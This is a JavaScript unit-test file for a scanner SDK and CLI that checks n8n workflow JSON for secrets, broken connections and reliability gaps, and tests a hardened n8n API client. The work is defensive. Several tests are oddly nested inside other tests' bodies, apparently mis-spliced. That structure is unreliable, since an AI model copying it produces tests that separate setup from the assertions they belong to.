test("data-flow analysis accepts a known Set field and skips ambiguous upstreams", () => {
    const workflow = {
        nodes: [
            nodeWithRequiredProperties({
                id: "set",
                name: "Set",
                type: "n8n-nodes-base.set",
                typeVersion: 3,
                parameters: {
                    includeOtherFields: false,
                    assignments: { assignments: [{ name: "present", value: "1", type: "string" }] }
                }
            }),
            nodeWithRequiredProperties({
                id: "http",
                name: "HTTP",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "={{ $json.present }}" }
            })
        ],
        connections: {
            Set: { main: [[{ node: "HTTP", type: "main", index: 0 }]] }
        }
    };
    assert.equal(sdk.scanWorkflow(workflow).findings.some((entry) => entry.ruleId === "DATAFLOW001"), false);

    workflow.nodes.push(nodeWithRequiredProperties({ id: "other", name: "Other" }));
    workflow.connections.Other = { main: [[{ node: "HTTP", type: "main", index: 0 }]] };
    assert.equal(sdk.scanWorkflow(workflow).findings.some((entry) => entry.ruleId === "DATAFLOW001"), false);
});

test("reliability checks require concrete failure or retry configuration evidence", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "request",
                name: "Create",
                type: "n8n-nodes-base.httpRequest",
                retryOnFail: true,
                maxTries: 3,
                parameters: { requestMethod: "POST" }
            }),
            nodeWithRequiredProperties({
                id: "recover",
                name: "Recover",
                onError: "continueErrorOutput"
            }),
            nodeWithRequiredProperties({
                id: "fallback",
                name: "Fallback",
                onError: "continueRegularOutput"
            })
        ],
        connections: {}
    });
    const findings = result.findings.filter((finding) => finding.ruleId.startsWith("RELIABILITY"));
    assert.deepEqual(findingIds(findings), ["RELIABILITY003", "RELIABILITY001", "RELIABILITY002"]);
    assert(findings.every((finding) => finding.severity === "warning"));
});

test("data-flow checks only infer fields from a supported explicit Set schema", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "set",
                name: "Set",
                type: "n8n-nodes-base.set",
                typeVersion: 3,
                parameters: {
                    includeOtherFields: false,
                    assignments: { assignments: [{ name: "present", value: "1", type: "string" }] }
                }
            }),
            nodeWithRequiredProperties({
                id: "http",
                name: "HTTP",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "={{ $json.missing }}" }
            })
        ],
        connections: {
            Set: { main: [[{ node: "HTTP", type: "main", index: 0 }]] }
        }
    });
    const finding = result.findings.find((entry) => entry.ruleId === "DATAFLOW001");
    assert(finding);
    assert.equal(finding.nodeId, "http");
    assert.equal(finding.location, "nodes[1].parameters.url");
    assert.match(finding.message, /explicit output fields/);

    const unsupported = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "trigger",
                name: "Start",
                type: "n8n-nodes-base.webhook"
            }),
            nodeWithRequiredProperties({
                id: "http",
                name: "HTTP",
                type: "n8n-nodes-base.httpRequest",
                parameters: { url: "={{ $json.unknown }}" }
            })
        ],
        connections: {
            Start: { main: [[{ node: "HTTP", type: "main", index: 0 }]] }
        }
    });
    assert.equal(unsupported.findings.some((entry) => entry.ruleId === "DATAFLOW001"), false);
});

test("unsupported platforms fail explicitly", () => {
    assert.throws(
        () => runChecks({}, "unsupported"),
        /Unsupported platform: unsupported/
    );
});

test("SDK parses and serializes workflow JSON", () => {
    const workflow = sdk.parseWorkflow('{"name":"SDK workflow","nodes":[]}');

    assert.equal(workflow.name, "SDK workflow");
    assert.deepEqual(JSON.parse(sdk.serializeWorkflow(workflow)), workflow);
    assert.match(sdk.serializeWorkflow(workflow, { space: 0 }), /"name":"SDK workflow"/);
    assert.deepEqual(sdk.parseWorkflow('\uFEFF{"name":"BOM workflow"}'), { name: "BOM workflow" });
    assert.throws(() => sdk.parseWorkflow("{invalid"), /Invalid workflow JSON/);
    assert.throws(
        () => sdk.serializeWorkflow({ value: 1 }, { space: null }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
});

test("SDK imports, scans, and exports a workflow file", async () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-sdk-"));
    const inputPath = path.join(temporaryDirectory, "input.json");
    const outputPath = path.join(temporaryDirectory, "output.json");

    try {
        fs.copyFileSync(samplePath, inputPath);
        const workflow = await sdk.importWorkflow(inputPath);
        const result = sdk.scanWorkflow(workflow);

        assert.equal(result.totalFindings, 0);
        assert.equal(await sdk.scanWorkflowFile(inputPath).then((scan) => scan.totalFindings), 0);
        assert.equal(await sdk.exportWorkflow(workflow, outputPath), outputPath);
        assert.deepEqual(JSON.parse(fs.readFileSync(outputPath, "utf8")), workflow);
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("SDK enforces bounded local workflow imports", async () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-sdk-size-"));
    const inputPath = path.join(temporaryDirectory, "workflow.json");

    try {
        fs.writeFileSync(inputPath, '{"name":"Workflow"}', "utf8");
        await assert.rejects(
            sdk.importWorkflow(inputPath, { maxFileBytes: 4 }),
            (error) => error.code === "ERR_TERVIC_FILE_TOO_LARGE"
        );
        await assert.rejects(
            sdk.importWorkflow(inputPath, { maxFileBytes: 0 }),
            (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
        );
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("SDK scan result never exposes a detected secret", () => {
    const secretValue = "sdk-private-test-value-123";
    const result = sdk.scanWorkflow({
        nodes: [],
        connections: {},
        api_key: secretValue
    });

    test("SDK secret scanner reports only one finding per value location", () => {
        const findings = sdk.scanForSecrets({
            api_key: "api_key=another-private-value"
        });

        assert.equal(findings.length, 1);
        assert.equal(findings[0].location, "workflow.api_key");
    });

    test("SDK can be imported through its native ESM entry point", async () => {
        const moduleUrl = pathToFileURL(path.join(projectRoot, "sdk", "index.mjs"));
        const esmSdk = await import(moduleUrl.href);

        assert.equal(typeof esmSdk.createN8nClient, "function");
        assert.equal(typeof esmSdk.scanWorkflow, "function");
        assert.equal(typeof esmSdk.default.scanWorkflow, "function");
        assert.equal(
            esmSdk.scanWorkflow({ nodes: [], connections: {} }).totalFindings,
            0
        );
    });

    assert(result.findings.some((finding) => finding.ruleId === "SECRET001"));
    assert.equal(JSON.stringify(result).includes(secretValue), false);
});

test("SDK reports stable errors for invalid inputs and file failures", async () => {
    assert.throws(
        () => sdk.scanWorkflow({}, null),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
    assert.throws(
        () => sdk.scanWorkflow({}, { platform: "other" }),
        (error) => error.code === "ERR_TERVIC_UNSUPPORTED_PLATFORM"
    );
    assert.throws(
        () => sdk.serializeWorkflow({ value: 1 }, null),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
    await assert.rejects(
        sdk.importWorkflow(path.join(os.tmpdir(), `missing-${process.pid}.json`)),
        (error) => error.code === "ERR_TERVIC_READ_FAILED" && Boolean(error.cause)
    );

    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-sdk-errors-"));
    const invalidJsonPath = path.join(temporaryDirectory, "invalid.json");
    const invalidUtf8Path = path.join(temporaryDirectory, "invalid-utf8.json");
    try {
        fs.writeFileSync(invalidJsonPath, "{invalid", "utf8");
        fs.writeFileSync(invalidUtf8Path, Buffer.from([0x7B, 0x22, 0x6E, 0x61, 0x6D, 0x65, 0x22, 0x3A, 0x22, 0xC3, 0x28, 0x22, 0x7D]));
        await assert.rejects(
            sdk.importWorkflow(invalidJsonPath),
            (error) => error.code === "ERR_TERVIC_INVALID_JSON" && Boolean(error.cause)
        );
        await assert.rejects(
            sdk.importWorkflow(invalidUtf8Path),
            (error) => error.code === "ERR_TERVIC_INVALID_JSON" && Boolean(error.cause)
        );
        await assert.rejects(
            sdk.exportWorkflow({ value: 1 }, path.join(temporaryDirectory, "missing", "out.json")),
            (error) => error.code === "ERR_TERVIC_WRITE_FAILED" && Boolean(error.cause)
        );
        assert.deepEqual(fs.readdirSync(temporaryDirectory), ["invalid-utf8.json", "invalid.json"]);
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("SDK isolates a cyclic-data rule failure without overflowing", () => {
    const workflow = { nodes: [], connections: {} };
    workflow.self = workflow;

    const result = sdk.scanWorkflow(workflow);
    assert(result.findings.some((finding) => finding.ruleId === "TERVIC.ENGINE.001"));
    assert.deepEqual(findingIds(result.findings).filter((ruleId) => ruleId.startsWith("N8N")), []);
});

test("SDK reports a depth-bound failure without overflowing", () => {
    const workflow = { nodes: [], connections: {} };
    let current = workflow;
    for (let depth = 0; depth < 1100; depth += 1) {
        current.next = {};
        current = current.next;
    }

    const result = sdk.scanWorkflow(workflow);
    assert(result.findings.some((finding) => finding.ruleId === "TERVIC.ENGINE.001"));
});

test("all engine findings use the shared schema and classify certainty", () => {
    const result = sdk.scanWorkflow({
        nodes: [{ name: "Unnamed ID" }],
        connections: {},
        credentials: { api_key: "known-fixture-secret-value" }
    });

    test("scan metadata reports bounded workflow metrics and per-rule check outcomes", () => {
        const result = sdk.scanWorkflow({
            nodes: [{ id: "trigger", name: "Start", type: "n8n-nodes-base.manualTrigger" }],
            connections: {}
        });

        assert.equal(result.workflowMetrics.nodeCount, 1);
        assert.equal(result.workflowMetrics.connectionCount, 0);
        assert.equal(result.checkSummary.totalChecks, result.checkSummary.checks.length);
        assert.equal(result.checkSummary.checks.find((check) => check.ruleId === "N8N001").status, "passed");
        assert.equal(result.checkSummary.checks.find((check) => check.ruleId === "DATAFLOW001").status, "skipped");

        const selected = sdk.scanWorkflow({ nodes: [], connections: {} }, {
            enabledRules: ["N8N001"]
        });
        assert.equal(selected.checkSummary.checks.find((check) => check.ruleId === "N8N001").status, "passed");
        assert.equal(selected.checkSummary.checks.find((check) => check.ruleId === "SECURITY001").status, "skipped");

        const bounded = sdk.scanWorkflow({ nodes: [], connections: { Start: { main: [[{}, {}]] } } }, {
            limits: { maxConnections: 1 }
        });
        assert.equal(bounded.workflowMetrics.connectionCount, null);
    });

    assert(result.findings.length > 0);
    for (const finding of result.findings) {
        assert.deepEqual(Object.keys(finding), [
            "ruleId", "severity", "title", "message", "nodeId", "nodeName",
            "recommendation", "location", "certainty"
        ]);
        assert(["error", "warning"].includes(finding.severity));
        assert(["confirmed", "heuristic"].includes(finding.certainty));
    }
    assert(result.findings.some((finding) =>
        finding.ruleId === "SECRET001" &&
        finding.severity === "warning" &&
        finding.certainty === "confirmed"
    ));
    assert.equal(result.analysisCoverage.dataFlow.status, "partial");
    assert.deepEqual(result.analysisCoverage.dataFlow.supportedNodeTypes, ["n8n-nodes-base.set"]);
});

test("scan configuration selects individual rules and disables groups", () => {
    const workflow = {
        nodes: [
            { id: "dup", name: "Repeated" },
            { id: "dup", name: "Repeated" },
            { id: "", name: "Third" }
        ],
        connections: { Unknown: { main: [[{ node: "Missing", type: "main", index: 0 }]] } },
        credentials: { api_key: "private-selected-rule-secret" }
    };

    const selected = sdk.scanWorkflow(workflow, { enabledRules: ["N8N005"] });
    assert.deepEqual(findingIds(selected.findings), ["N8N005"]);

    const disabledSingle = sdk.scanWorkflow(workflow, { disabledRules: ["N8N006"] });
    assert.equal(disabledSingle.findings.some((finding) => finding.ruleId === "N8N006"), false);
    assert(disabledSingle.findings.some((finding) => finding.ruleId === "N8N005"));
    assert(disabledSingle.findings.some((finding) => finding.ruleId === "N8N007"));

    const disabled = sdk.scanWorkflow(workflow, { disabledRules: ["SECURITY_SECRETS"] });
    assert.equal(disabled.findings.some((finding) => finding.ruleId === "SECRET001"), false);
    assert.equal(JSON.stringify(disabled).includes("private-selected-rule-secret"), false);
    assert.throws(
        () => sdk.scanWorkflow(workflow, { disabledRules: ["UNKNOWN_RULE"] }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
});

test("resource limits bound node checks and finding output", () => {
    const nodeLimited = sdk.scanWorkflow({
        nodes: [{ id: "one", name: "One" }, { id: "two", name: "Two" }],
        connections: {}
    }, { limits: { maxNodes: 1 } });
    assert(nodeLimited.findings.some((finding) => finding.ruleId === "TERVIC.LIMIT.001"));

    const connectionLimited = sdk.scanWorkflow({
        nodes: [{ id: "one", name: "One" }],
        connections: { One: { main: [[{ node: "One" }]] } }
    }, { limits: { maxConnections: 2 } });
    assert(connectionLimited.findings.some((finding) => finding.ruleId === "TERVIC.LIMIT.001"));

    const findingLimited = sdk.scanWorkflow({
        nodes: Array.from({ length: 10 }, (_, index) => ({ name: `Node ${index}` })),
        connections: {}
    }, { limits: { maxFindings: 3 } });
    assert.equal(findingLimited.findings.length, 3);
    assert.equal(findingLimited.findings[2].ruleId, "TERVIC.LIMIT.002");
    assert.throws(
        () => sdk.scanWorkflow({}, { limits: { maxValues: 0 } }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
});

test("secret values are redacted from other rule metadata and scans are read-only", () => {
    const secretValue = "private-node-name-secret";
    const workflow = {
        nodes: [{ name: secretValue }],
        connections: {},
        credentials: { api_key: secretValue }
    };
    const before = JSON.stringify(workflow);
    const result = sdk.scanWorkflow(workflow);

    assert.equal(JSON.stringify(result).includes(secretValue), false);
    assert.equal(JSON.stringify(workflow), before);
});

test("short detected credentials are not exposed through node metadata", () => {
    const result = sdk.scanWorkflow({
        nodes: [
            nodeWithRequiredProperties({
                id: "node-abc",
                name: "workflow-abc-copy"
            })
        ],
        connections: {},
        credentials: { api_key: "abc" }
    });

    assert.equal(JSON.stringify(result).includes("abc"), false);
});

test("rule failures do not prevent independent validation rules", () => {
    const result = sdk.scanWorkflow(
        { nodes: null, connections: {} },
        { limits: { maxValues: 1 } }
    );
    assert(result.findings.some((finding) => finding.ruleId === "N8N002"));
    assert(result.findings.some((finding) => finding.ruleId === "TERVIC.ENGINE.001"));
});

test("secret fixtures detect credentials but ignore environment placeholders", () => {
    const findings = sdk.scanForSecrets({
        api_key: "fixture-known-secret-value",
        token: "fixture-known-token-value",
        password: "${DATABASE_PASSWORD}",
        client_secret: "$env.CLIENT_SECRET",
        inline: "api_key=fixture-known-inline-secret"
    });

    assert.deepEqual(findings.map((finding) => finding.location), [
        "workflow.api_key",
        "workflow.token",
        "workflow.inline"
    ]);
    assert.deepEqual(findings.map((finding) => finding.certainty), [
        "confirmed",
        "confirmed",
        "heuristic"
    ]);
    assert.equal(JSON.stringify(findings).includes("fixture-known"), false);
});

test("large workflow performance stays within the bounded scan budget", () => {
    const nodes = Array.from({ length: 10000 }, (_, index) => ({
        id: `node-${index}`,
        name: `Node ${index}`,
        type: index === 0 ? "n8n-nodes-base.manualTrigger" : "n8n-nodes-base.noOp",
        typeVersion: 1,
        position: [index, 0],
        parameters: {}
    }));
    const workflow = {
        nodes,
        connections: Object.fromEntries(nodes.slice(0, -1).map((node, index) => [
            node.name,
            { main: [[{ node: nodes[index + 1].name, type: "main", index: 0 }]] }
        ]))
    };
    const started = process.hrtime.bigint();
    const result = sdk.scanWorkflow(workflow, { limits: { maxValues: 300000 } });
    const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;

    assert.equal(result.totalFindings, 0);
    assert(elapsedMs < 5000, `10k-node scan took ${elapsedMs.toFixed(0)}ms`);
});

test("SDK export replaces an existing file without partial output", async () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-sdk-replace-"));
    const outputPath = path.join(temporaryDirectory, "workflow.json");

    try {
        fs.writeFileSync(outputPath, '{"old":true}', "utf8");
        await sdk.exportWorkflow({ replacement: true }, outputPath);
        assert.deepEqual(JSON.parse(fs.readFileSync(outputPath, "utf8")), { replacement: true });
        assert.deepEqual(fs.readdirSync(temporaryDirectory), ["workflow.json"]);
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("n8n client validates configuration and protects remote transport", () => {
    assert.throws(
        () => sdk.createN8nClient({ baseUrl: "https://n8n.example.com", apiKey: "" }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
    assert.throws(
        () => sdk.createN8nClient({ baseUrl: "http://n8n.example.com", apiKey: "test-key" }),
        (error) => error.code === "ERR_TERVIC_INSECURE_TRANSPORT"
    );
    assert.throws(
        () => sdk.createN8nClient({ baseUrl: "https://user:pass@n8n.example.com", apiKey: "test-key" }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
    assert.throws(
        () => sdk.createN8nClient({
            baseUrl: "https://n8n.example.com",
            apiKey: "test-key",
            timeoutMs: 0
        }),
        (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
    );
});

test("n8n client paginates lists and handles get, create, and update", async () => {
    const seen = [];
    const mock = await createMockN8n((request, response) => {
        seen.push({
            method: request.method,
            url: request.url,
            apiKey: request.headers["x-n8n-api-key"],
            idempotencyKey: request.headers["idempotency-key"]
        });

        if (request.url.startsWith("/instance/api/v1/workflows?")) {
            const query = new URL(request.url, "http://localhost").searchParams;
            if (!query.has("cursor")) {
                respondJson(response, 200, {
                    data: [{ id: "one" }],
                    nextCursor: "next / cursor"
                });
            } else {
                respondJson(response, 200, { data: [{ id: "two" }], nextCursor: null });
            }
            return;
        }

        if (request.method === "GET") {
            respondJson(response, 200, { id: "id/with space", name: "Remote", nodes: [], connections: {} });
            return;
        }

        let body = "";
        request.setEncoding("utf8");
        request.on("data", (chunk) => { body += chunk; });
        request.on("end", () => {
            const parsed = JSON.parse(body);
            seen[seen.length - 1].body = parsed;
            respondJson(response, request.method === "POST" ? 201 : 200, {
                id: request.method === "POST" ? "created" : "updated",
                name: parsed.name,
                received: parsed
            });
        });
    });

    try {
        const client = sdk.createN8nClient({
            baseUrl: mock.baseUrl,
            apiKey: "test-api-key"
        });
        const workflows = await client.listWorkflows({ limit: 25 });
        assert.deepEqual(workflows.map((workflow) => workflow.id), ["one", "two"]);
        assert.equal(seen[0].url, "/instance/api/v1/workflows?limit=25");
        assert(seen[1].url.includes("cursor=next+%2F+cursor"));
        const page = await client.listWorkflowsPage({
            limit: 1,
            cursor: "next / cursor"
        });
        assert.deepEqual(page.data, [{ id: "two" }]);
        assert.equal(page.nextCursor, null);
        assert.equal((await client.getWorkflow("id/with space")).name, "Remote");

        const workflow = {
            name: "SDK workflow",
            nodes: [],
            connections: {},
            id: "source-id",
            active: true,
            createdAt: "server-managed",
            settings: { executionOrder: "v1" },
            unknownField: "not-an-api-field"
        };
        assert.equal((await client.createWorkflow(workflow, {
            idempotencyKey: "create-test-1"
        })).id, "created");
        assert.deepEqual(
            Object.keys(seen[4].body),
            ["name", "nodes", "connections", "settings"]
        );
        assert.equal(seen[4].body.id, undefined);
        assert.equal(seen[4].body.active, undefined);
        assert.equal((await client.updateWorkflow("workflow-1", workflow)).id, "updated");
        assert.deepEqual(seen[5].body, seen[4].body);
        assert(seen.every((request) => request.apiKey === "test-api-key"));
        assert.equal(seen[4].idempotencyKey, "create-test-1");
        assert.deepEqual(
            seen.map((request) => request.method),
            ["GET", "GET", "GET", "GET", "POST", "PUT"]
        );
    } finally {
        await mock.close();
    }
});

test("n8n client imports local JSON and exports remote workflows", async () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-sdk-api-files-"));
    const inputPath = path.join(temporaryDirectory, "input.json");
    const outputPath = path.join(temporaryDirectory, "remote.json");
    fs.copyFileSync(samplePath, inputPath);

    const mock = await createMockN8n((request, response) => {
        if (request.method === "POST") {
            let body = "";
            request.setEncoding("utf8");
            request.on("data", (chunk) => { body += chunk; });
            request.on("end", () => {
                respondJson(response, 201, { id: "imported", workflow: JSON.parse(body) });
            });
            return;
        }

        respondJson(response, 200, JSON.parse(fs.readFileSync(samplePath, "utf8")));
    });

    try {
        const client = sdk.createN8nClient({
            baseUrl: mock.baseUrl,
            apiKey: "test-api-key"
        });
        const imported = await client.importWorkflow(inputPath);
        assert.equal(imported.id, "imported");
        assert.equal(imported.workflow.name, "Tervic Test Workflow");

        assert.equal(await client.exportWorkflow("remote-id", outputPath), outputPath);
        assert.deepEqual(
            JSON.parse(fs.readFileSync(outputPath, "utf8")),
            JSON.parse(fs.readFileSync(samplePath, "utf8"))
        );
    } finally {
        await mock.close();
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("n8n client fails safely on API errors, invalid responses, and redirects", async () => {
    const apiKey = "do-not-leak-this-key";
    const mock = await createMockN8n((request, response) => {
        if (request.url.endsWith("/unauthorized")) {
            respondJson(response, 401, { message: apiKey });
        } else if (request.url.endsWith("/bad-json")) {
            response.writeHead(200, { "Content-Type": "application/json" });
            response.end("{not-json");
        } else {
            response.writeHead(302, { Location: "https://elsewhere.example/" });
            response.end();
        }
    });

    try {
        const client = sdk.createN8nClient({ baseUrl: mock.baseUrl, apiKey });
        await assert.rejects(
            client.getWorkflow("unauthorized"),
            (error) => error.code === "ERR_TERVIC_N8N_API" &&
                error.statusCode === 401 &&
                !error.message.includes(apiKey)
        );
        await assert.rejects(
            client.getWorkflow("bad-json"),
            (error) => error.code === "ERR_TERVIC_INVALID_API_RESPONSE"
        );
        await assert.rejects(
            client.getWorkflow("redirect"),
            (error) => error.code === "ERR_TERVIC_REDIRECT_REJECTED"
        );
    } finally {
        await mock.close();
    }
});

test("n8n client enforces response limits and request timeouts", async () => {
    const mock = await createMockN8n((request, response) => {
        if (request.url.endsWith("/slow")) {
            setTimeout(() => {
                if (!response.destroyed) respondJson(response, 200, { id: "slow" });
            }, 100);
            return;
        }

        response.writeHead(200, { "Content-Type": "application/json" });
        response.end(JSON.stringify({ payload: "x".repeat(300) }));
    });

    test("n8n client enforces request size limits before sending data", async () => {
        let requestCount = 0;
        const mock = await createMockN8n((request, response) => {
            requestCount += 1;
            respondJson(response, 201, { id: "created" });
        });

        try {
            const client = sdk.createN8nClient({
                baseUrl: mock.baseUrl,
                apiKey: "test-key",
                maxRequestBytes: 32
            });
            await assert.rejects(
                client.createWorkflow({
                    name: "Large",
                    nodes: [],
                    connections: {},
                    description: "x".repeat(100)
                }),
                (error) => error.code === "ERR_TERVIC_REQUEST_TOO_LARGE"
            );
            assert.equal(requestCount, 0);
        } finally {
            await mock.close();
        }
    });

    test("n8n client supports abort signals and validates idempotency keys", async () => {
        const mock = await createMockN8n((request, response) => {
            setTimeout(() => {
                if (!response.destroyed) respondJson(response, 200, { id: "late" });
            }, 100);
        });

        try {
            const client = sdk.createN8nClient({ baseUrl: mock.baseUrl, apiKey: "test-key" });
            const controller = new AbortController();
            const pending = client.getWorkflow("slow", { signal: controller.signal });
            controller.abort();
            await assert.rejects(
                pending,
                (error) => error.code === "ERR_TERVIC_REQUEST_ABORTED"
            );
            await assert.rejects(
                client.createWorkflow(
                    { name: "Workflow", nodes: [], connections: {} },
                    { idempotencyKey: "bad\nkey" }
                ),
                (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
            );
        } finally {
            await mock.close();
        }
    });

    try {
        const sizeLimitedClient = sdk.createN8nClient({
            baseUrl: mock.baseUrl,
            apiKey: "test-key",
            maxResponseBytes: 100
        });
        await assert.rejects(
            sizeLimitedClient.getWorkflow("large"),
            (error) => error.code === "ERR_TERVIC_RESPONSE_TOO_LARGE"
        );

        const timedClient = sdk.createN8nClient({
            baseUrl: mock.baseUrl,
            apiKey: "test-key",
            timeoutMs: 20
        });
        await assert.rejects(
            timedClient.getWorkflow("slow"),
            (error) => error.code === "ERR_TERVIC_TIMEOUT"
        );
    } finally {
        await mock.close();
    }
});

test("n8n client rejects invalid workflow inputs and repeated cursors", async () => {
    const mock = await createMockN8n((request, response) => {
        if (request.url.startsWith("/instance/api/v1/workflows?")) {
            respondJson(response, 200, { data: [], nextCursor: "same" });
        } else {
            respondJson(response, 200, {});
        }
    });

    try {
        const client = sdk.createN8nClient({ baseUrl: mock.baseUrl, apiKey: "test-key" });
        await assert.rejects(
            client.createWorkflow({ nodes: [], connections: {} }),
            (error) => error.code === "ERR_TERVIC_INVALID_WORKFLOW"
        );
        await assert.rejects(
            client.listWorkflows({ maxPages: 5 }),
            (error) => error.code === "ERR_TERVIC_PAGINATION_LOOP"
        );
        await assert.rejects(
            client.listWorkflows({ limit: 251 }),
            (error) => error.code === "ERR_TERVIC_INVALID_ARGUMENT"
        );
    } finally {
        await mock.close();
    }
});

test("CLI passes a valid workflow with exit code 0", () => {
    const result = runCli([samplePath]);

    assert.equal(result.error, undefined);
    assert.equal(result.status, 0, result.stderr);
    assert.match(result.stdout, /PASS: No issues detected/);
    assert.match(result.stdout, /Data-flow coverage: Field-reference checks only model/);
});

test("CLI rejects invalid JSON with exit code 1", () => {
    const result = runCli([invalidJsonPath]);

    assert.equal(result.status, 1);
    assert.match(result.stderr, /Invalid JSON file/);
});

test("CLI reports invalid workflows with exit code 1", () => {
    const result = runCli([secretWorkflowPath]);

    assert.equal(result.status, 1);
    assert.match(result.stdout, /SECRET001/);
    assert.match(result.stdout, /Certainty: confirmed/);
    assert.match(result.stdout, /Recommendation: Use secure credential storage/);
    assert.equal(result.stdout.includes("fake_demo_key_12345"), false);
});

test("CLI reports a missing file with exit code 2", () => {
    const missingPath = path.join(os.tmpdir(), `tervic-missing-${process.pid}.json`);
    const result = runCli([missingPath]);

    assert.equal(result.status, 2);
    assert.match(result.stderr, /File not found/);
});

test("CLI prints usage and returns exit code 2 without a file", () => {
    const result = runCli([]);

    assert.equal(result.status, 2);
    assert.match(result.stderr, /Usage: tervic-check/);
});

test("CLI help and version commands succeed", () => {
    const help = runCli(["--help"]);
    assert.equal(help.status, 0, help.stderr);
    assert.match(help.stdout, /Scan a local n8n workflow JSON file/);
    assert.match(help.stdout, /--version/);
    assert.equal(runCli(["-h"]).status, 0);

    const version = runCli(["--version"]);
    assert.equal(version.status, 0, version.stderr);
    assert.equal(version.stdout.trim(), require("../package.json").version);
    assert.equal(runCli(["-v"]).stdout.trim(), version.stdout.trim());
});

test("CLI rejects unknown options and extra file arguments", () => {
    const unknown = runCli(["--json"]);
    assert.equal(unknown.status, 2);
    assert.match(unknown.stderr, /Unknown option: --json/);

    const extra = runCli([samplePath, samplePath]);
    assert.equal(extra.status, 2);
    assert.match(extra.stderr, /Exactly one workflow file/);
});

test("CLI scans relative paths from the caller working directory without modifying input", () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-cli-"));
    const workflowPath = path.join(temporaryDirectory, "workflow with spaces.json");
    const optionLikePath = path.join(temporaryDirectory, "-workflow.json");
    const source = fs.readFileSync(samplePath);

    try {
        fs.writeFileSync(workflowPath, source);
        const result = runCli(["workflow with spaces.json"], { cwd: temporaryDirectory });
        assert.equal(result.status, 0, result.stderr);
        assert.deepEqual(fs.readFileSync(workflowPath), source);

        fs.writeFileSync(optionLikePath, source);
        const optionLike = runCli(["--", "-workflow.json"], { cwd: temporaryDirectory });
        assert.equal(optionLike.status, 0, optionLike.stderr);
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

test("CLI reports unreadable directories, malformed UTF-8, and oversized workflows", () => {
    const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "tervic-cli-limits-"));
    const invalidUtf8Path = path.join(temporaryDirectory, "invalid-utf8.json");
    const oversizedPath = path.join(temporaryDirectory, "oversized.json");

    try {
        fs.writeFileSync(invalidUtf8Path, Buffer.from([0x7B, 0x22, 0x6E, 0x61, 0x6D, 0x65, 0x22, 0x3A, 0x22, 0xC3, 0x28, 0x22, 0x7D]));
        fs.writeFileSync(oversizedPath, Buffer.alloc(50 * 1024 * 1024 + 1));

        const directory = runCli([temporaryDirectory]);
        assert.equal(directory.status, 2);
        assert.match(directory.stderr, /Unable to read workflow/);

        const invalidUtf8 = runCli([invalidUtf8Path]);
        assert.equal(invalidUtf8.status, 1);
        assert.match(invalidUtf8.stderr, /Invalid JSON file/);

        const oversized = runCli([oversizedPath]);
        assert.equal(oversized.status, 2);
        assert.match(oversized.stderr, /50 MiB|52428800-byte limit/);
    } finally {
        fs.rmSync(temporaryDirectory, { recursive: true, force: true });
    }
});

runTests();
